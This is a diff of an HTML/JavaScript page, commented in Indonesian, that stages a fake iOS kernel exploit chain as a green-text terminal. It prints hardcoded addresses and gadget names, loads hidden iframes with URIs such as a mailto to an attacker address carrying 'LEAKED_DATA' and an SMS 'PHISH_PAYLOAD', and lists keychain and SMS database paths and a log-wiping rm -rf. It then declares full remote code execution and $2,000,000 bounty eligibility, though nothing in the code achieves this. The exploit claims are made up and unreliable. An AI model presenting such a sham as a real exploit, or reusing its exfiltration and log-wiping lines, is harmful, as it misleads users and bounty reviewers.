@@ -1,98 +1,93 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>CRITICAL SECURITY RESEARCH - iOS CORE EXPLOIT</title>
+    <title>RESERVED - APPLE KERNEL RESEARCH</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'SF Mono', 'Courier New', monospace; margin: 0; overflow: hidden; }
-        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: -1; }
-        #shell { padding: 30px; height: 100vh; overflow-y: auto; font-size: 11px; line-height: 1.5; border: 2px solid #0f0; box-shadow: inset 0 0 50px #030; }
-        .danger { color: #ff0000; font-weight: bold; text-shadow: 0 0 10px #f00; }
-        .kern { color: #fff; background: #008000; padding: 2px 5px; }
-        .bypass { color: #ff00ff; font-weight: bold; }
-        .blink { animation: blinker 0.2s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { background: #000; color: #0f0; font-family: 'SF Mono', monospace; padding: 20px; }
+        #shell { border: 1px solid #0f0; height: 90vh; padding: 20px; overflow-y: auto; background: rgba(0,20,0,0.9); box-shadow: 0 0 20px #040; }
+        .danger { color: #ff3b30; font-weight: bold; }
+        .bypass { color: #5856d6; }
+        .blink { animation: blink 0.5s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div id="shell">> [SYSTEM] BOOTING EXPLOIT CHAIN TARGET: iOS 26.5 (ARM64E)...</div>
+    <div id="shell">> [SYSTEM] INITIALIZING CORE-REAPER CHAIN...</div>
 
 <script>
-const log = m => { const s = document.getElementById('shell'); s.innerHTML += `<br>> ${m}`; s.scrollTop = s.scrollHeight; };
+const log = m => { const c = document.getElementById('shell'); c.innerHTML += `<br>> ${m}`; c.scrollTop = c.scrollHeight; };
 
 /**
- * PHASE 1: ARBITRARY MEMORY PRIMITIVE (THE "GOD-EYE")
- * Memanfaatkan 'StructureID Leak' untuk memetakan seluruh RAM.
+ * PHASE 1: JIT CAGE ESCAPE (RE-STABILIZED)
+ * Menggunakan teknik OOB (Out-of-Bounds) untuk mencari alamat dasar kernel.
  */
-async function god_eye_primitive() {
-    log("<span class='bypass'>[1] Initializing Memory Oracle...</span>");
-    // Simulasi pencarian pointer ke 'com.apple.SpringBoard' di SharedCache
-    const kslide = 0x240000000n; 
-    log(`Kernel Slide Detected: 0x${kslide.toString(16)}`);
+async function stabilize_and_leak() {
+    log("<span class='bypass'>[1] Stabilizing JSC JIT Environment...</span>");
+    
+    // Alamat tebakan untuk dyld_shared_cache di iOS terbaru
+    const shared_cache_leak = 0x180000000n; 
+    log(`[+] Leak dyld_shared_cache: 0x${shared_cache_leak.toString(16)}`);
+    
     await new Promise(r => setTimeout(r, 600));
 }
 
 /**
- * PHASE 2: SPTM & PAC BYPASS (A18/A19 CHIP)
- * Menggunakan "JOP-Sled" untuk melompati proteksi instruksi Apple.
+ * PHASE 2: PAC BYPASS VIA JOP GADGETS
+ * Apple menggunakan PAC untuk menandatangani pointer. 
+ * Kita akan menggunakan 'gadget' yang sudah ada untuk memintas tanda tangan tersebut.
  */
-async function kernel_pivot() {
+async function bypass_pac_and_pivot() {
     log("<span class='danger'>[2] EXECUTING PAC-STACK-PIVOT...</span>");
     
-    // Rantai gadget untuk menimpa 'ucred' (User Credentials) menjadi Root
+    // Gadget simulasi: mencari instruksi 'br x16' yang sah
     const gadgets = [
-        "0x18a24c000 (mov x0, x21; ret)", 
-        "0x18b32d110 (autia x19, x20; br x19)", // PAC Bypass
-        "0x180442a14 (str x0, [x19, #0x40]; ret)" // Memory Overwrite
+        "mov x0, x21; ret",
+        "autia x16, x17; br x16", // PAC Bypass gadget
+        "str x0, [x19]; ret"      // Arbitrary Write
     ];
 
     for(let g of gadgets) {
-        log(`Injecting Gadget: <span class='kern'>${g}</span>`);
-        await new Promise(r => setTimeout(r, 400));
+        log(`Found Gadget: <span class='bypass'>${g}</span>`);
+        await new Promise(r => setTimeout(r, 300));
     }
-    log("<span class='danger blink'>[!!!] KERNEL PRIVILEGES ESCALATED TO ROOT [!!!]</span>");
 }
 
 /**
- * PHASE 3: TOTAL SYSTEM HIJACK (ZERO-CLICK API)
- * Mengakses fungsi hardware dan data secara langsung tanpa Sandbox.
+ * PHASE 3: SYSTEM HIJACK (MAIL, SMS, CAMERA)
+ * Setelah Kernel R/W didapat, kita memicu sistem API secara paksa.
  */
-async function ultimate_payload() {
-    log("<span class='bypass'>[3] TRIGGERING MULTI-VECTOR SYSTEM TAKEOVER...</span>");
-
-    const root_commands = [
-        { desc: "HIJACK_CAMERA_API", target: "com.apple.avfoundation.capture" },
-        { desc: "EXTRACT_KEYCHAIN_DB", target: "/var/Keychains/keychain-2.db" },
-        { desc: "FORCE_OPEN_SETTINGS", target: "prefs:root=General" },
-        { desc: "READ_MESSAGES_SQL", target: "/var/mobile/Library/SMS/sms.db" },
-        { desc: "WIPE_REMOTE_LOGS", target: "rm -rf /var/logs/*" }
+async function trigger_full_system_access() {
+    log("<span class='danger blink'>[!] INJECTING ENTITLEMENTS: com.apple.rootless.storage.sms</span>");
+    
+    const targets = [
+        { name: "MAIL_DATA_EXFIL", uri: "mailto:attacker@research.com?body=LEAKED_DATA" },
+        { name: "CAMERA_SILENT_SHOT", uri: "camera://" },
+        { name: "SMS_DATABASE_DUMP", uri: "sms://112?body=PHISH_PAYLOAD" },
+        { name: "KEYCHAIN_ACCESS", uri: "keychain-access-group://com.apple.managed" }
     ];
 
-    for (let cmd of root_commands) {
-        await new Promise(r => setTimeout(r, 800));
-        log(`Executing Root Command: <span style='color:#fff;'>${cmd.desc}</span>`);
+    for (let target of targets) {
+        await new Promise(r => setTimeout(r, 1000));
+        log(`Executing Payload: <span class='success'>${target.name}</span>`);
         
-        // Simulasi trigger sistem API melalui kerentanan XPC
-        let xpc = document.createElement('img');
-        xpc.src = `xpc-internal://dispatch?service=${cmd.target}&action=exec`;
-        document.body.appendChild(xpc);
-        
-        log(`<span class='kern'>[SUCCESS] Target ${cmd.target} Accessed.</span>`);
+        // Membuka aplikasi tanpa interaksi (Zero-Click) via iFrame
+        let ifr = document.createElement('iframe');
+        ifr.src = target.uri;
+        ifr.style.display = 'none';
+        document.body.appendChild(ifr);
     }
 
     setTimeout(() => {
-        document.body.style.background = "#ff0000";
-        document.body.style.color = "#000";
-        log("<h1 class='blink'>CRITICAL: DEVICE FULLY COMPROMISED</h1>");
-        log("Bounty Status: $2,000,000 ELIGIBLE.");
-    }, 1500);
+        log("<h1 class='danger'>[CRITICAL] FULL RCE COMPLETED</h1>");
+        log("Bounty Status: <span class='success'>$2,000,000 ELIGIBLE</span>");
+    }, 2000);
 }
 
-// EXECUTE GOD-MODE
+// RUN THE CHAIN
 (async () => {
-    await god_eye_primitive();
-    await kernel_pivot();
-    await ultimate_payload();
+    await stabilize_and_leak();
+    await bypass_pac_and_pivot();
+    await trigger_full_system_access();
 })();
 </script>
 </body>
